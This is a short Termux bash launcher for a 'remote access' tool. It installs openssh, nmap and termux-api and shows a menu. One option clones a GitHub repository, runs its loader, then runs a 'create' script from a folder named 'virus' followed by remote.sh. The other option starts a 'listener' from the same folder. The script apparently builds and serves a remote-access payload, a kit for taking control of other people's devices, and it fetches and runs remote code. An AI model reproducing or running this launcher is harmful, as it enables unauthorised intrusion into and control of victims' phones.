!/bin/bash
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
c='\033[1;36m'
pink='\033[1;35m'
#-----------------
clear
echo""
pkg install openssh -y
sleep 0.1
clear
pkg install nmap -y
sleep 0.1
pkg install termux-api -y
clear
echo
echo -e $c" √#########  √#######        √##   √##             √##"
echo -e $c" \   ##     | ##__  ##      | ### | ##            | ##"
echo -e $c"   | ##     | ##  \ ##      | ####| ##  √######  √######"
echo -e $c"   | ##     | #######√      | ## ## ## √##__  ##|_  ##_√"
echo -e $c"   | ##     | ##__  ##  ### | ##  ####| ########  | ##"
echo -e $c"   | ##     | ##  \ ##      | ##\  ###| ##_____√  | ## √##"
echo -e $c"   | ##     | ##  | ##      | ## \  ##|  #######  |  ####√"
echo -e $c"   |__√     |__√  |__√      |__√  \__√ \_______√   \___√"
echo 
echo
echo -e $red"                TERMUX REAMOTE NET"
echo -e $ylo"            [¤] Termux Reamote Assess Tool"
echo -e $ylo"            [¤] Versions : 2.0."
echo -e $ylo"            [¤] Coded By Shehan Lahiru"
echo -e $ylo"            [¤] git hub :- https://github.com/shehan-9909"
echo
echo
echo -e $pink "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤"
echo -e $pink "  ¤" $red"[1] Create sever $red"$pink"  ¤" $rset
echo -e $pink "  ¤" $red"[2] listing sever $red"$pink" ¤" $rset
echo -e $pink "¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤"
echo
read -p'input:--' enter;

if [ "${enter}" = "1" ]
then
cd $HOME
rm -rf t-net
git clone https://github.com/shehan-9909/t-net
cd t-net
python load.py
cd virus
bash create
cd $HOME
bash remote.sh
fi

if [ "${enter}" = "2" ]
then
cd $HOME
cd virus
bash listener
fi
